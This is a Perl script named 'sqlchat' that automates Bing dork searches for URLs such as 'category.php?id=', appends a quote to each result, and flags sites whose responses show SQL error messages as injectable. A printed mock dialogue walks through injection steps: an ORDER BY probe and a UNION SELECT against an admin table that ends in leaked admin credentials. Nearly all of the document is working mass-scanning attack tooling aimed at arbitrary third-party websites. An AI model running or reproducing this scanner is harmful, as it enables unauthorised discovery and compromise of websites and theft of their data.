#!/usr/bin/perl
#eu gosto de assistir Mr. Robots*

use HTTP::Request;
use LWP::UserAgent;
use Getopt::Long;

$banner="
-==============================================-
\t\tCreate By Deffy0h
-==============================================-
";
$mode="sqlchat.pl -i|inurl 'category.php?id='";

print <<ew;




               888          888               d8  
 dP"Y  e88 888 888  e88'888 888 ee   ,"Y88b  d88  
C88b  d888 888 888 d888  '8 888 88b "8" 888 d88888
 Y88D Y888 888 888 Y888   , 888 888 ,ee 888  888  
d,dP   "88 888 888  "88,e8' 888 888 "88 888  888  
           888                                    
           888                                    

$banner

use:
$mode



ew

my $url;
my $dork;

GetOptions("i|inurl=s"=>\$dork);

print "you: hi, server.\n";
sleep(2);
print "server: hi, client, what do you want?\n";
sleep(2);
print "you: connect me to the site http://target.com/his.php?id=1\n";
sleep(2);
print "server: [+] OKAY! connect.\n";
sleep(2);
print "you: [+] thanks!\n";

print "\n-=============================================================-\n";

print "you: hi, server.\n";
sleep(2);
print "server: hi, client, what do you want?\n";
sleep(2);
print "you: connect me to the site http://target.com/his.php?id='1\n";
sleep(2);
print "server: you have error in your sql syntax \n";
sleep(2);
print "you: perfect ;) \n";
sleep(2);
print "hi: ' ORDER BY 1\n";
sleep(2);
print "hi: ' ONIUN SELECT * FROM admin\n";
sleep(2);
print "server: login: admin, password:hello123\n";
sleep(2);
print "exit lol ;)\n\n";

#print "\n\n WELCOME TO SQLCHAT \n\n"

unless($dork){
#target();
}else{
req_dork();
}

#sub target(){
#print "\n\n";
#print "URL: ";
#$url=<STDIN>;
#chomp($url);
#unless($url){
#print "\n[-] URL;\n";
#exit;
#}
#$dork="?id='1&s='1&q='1&p='1";
#if($url!~m/http:/){
#$url="http://".$url;
#}
#if($url!~m/[?]/){
#$url=$url.$dork;
#}
#print $url;
#}

sub req_dork(){
$url="http://www.bing.com/search?q=";
my $ua = new LWP::UserAgent; 
my @agente=(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; UNICOS lcLinux; en-US) Gecko/20140730 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0"
);
for($i=0;$i<10000000;$i++){
$uu=$url.$dork."&first=".$i."&FORM=PERE";
my $ag=@agente[int(rand(scalar(@agente)))];
print "\n\n";
print "[+] $uu\n";
print "[+] UserAgent: $ag\n";
print "[+] First: $i\n\n";
$ua->agent();
$ua->timeout(15);
my $request = HTTP::Request->new('GET');
$request->url($uu);

my $response = $ua->request($request);
if($response->code != 200){
print "[-]Erro\n";
}
$hm=$response->content;
my $OK_HTTP=200;
my @href=($hm=~m/href="(.*?)"|href='(.*?)'/g);
my @erro=(
"Microsoft OLE DB Provider for ODBC Drivers error '80040e14'",
"Microsoft OLE DB Provider for ODBC Drivers error '80040e07'",
"You have an error in your SQL syntax",
"ORA-00933: SQL command not properly ended",
"Query failed: ERROR: syntax error at or near",
);
foreach my $ai(@href){
if($ai!~m/microsoft/ && $ai!~m/[#]/ && $ai!~m/msn.com/ && $ai=~m/http:|https:/){
print "[+] checking vulnerability...\n";
$ua = LWP::UserAgent->new;
$fg=$ai."'";
print $fg."\n\n";
if($re=HTTP::Request->new(GET=>$fg)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$zp=$response->decoded_content;
for($e=0;$e<scalar(@erro);$e++){
if($zp=~m/@erro[$e]/){
print "[+] this $ai vulnerable to SQL injection\n";
exit;
}else{
print "[-] no have sql injection\n";
}
}
print "\n";
}else{
print "\n[-] ERRO \n";
}
}
}
}
}
}
